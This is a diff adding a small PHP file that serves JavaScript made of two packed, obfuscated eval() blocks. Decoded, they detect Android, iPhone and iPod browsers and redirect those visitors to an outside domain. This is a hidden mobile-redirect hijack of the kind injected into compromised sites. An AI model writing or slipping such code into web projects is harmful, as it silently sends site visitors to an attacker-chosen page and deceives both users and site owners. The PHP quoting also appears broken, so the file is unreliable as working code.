@@ -1,0 +1,5 @@
+<?php
+header('Content-type: text/javascript');
+echo 'document.write("eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('5((4.3.0(\'2\')!=-1)){7.c="b://a.8-9.6"}',13,13,'indexOf||Android|userAgent|navigator|if|com|document|x|om|www|http|location'.split('|'),0,{}))
+eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('5((3.0.1(/6/2))||(3.0.1(/4/2))){7.c("b://a.8-9.d")}',14,14,'userAgent|match|i|navigator|iPod|if|iPhone|location|x|om|www|http|replace|com'.split('|'),0,{}))");';
+?>
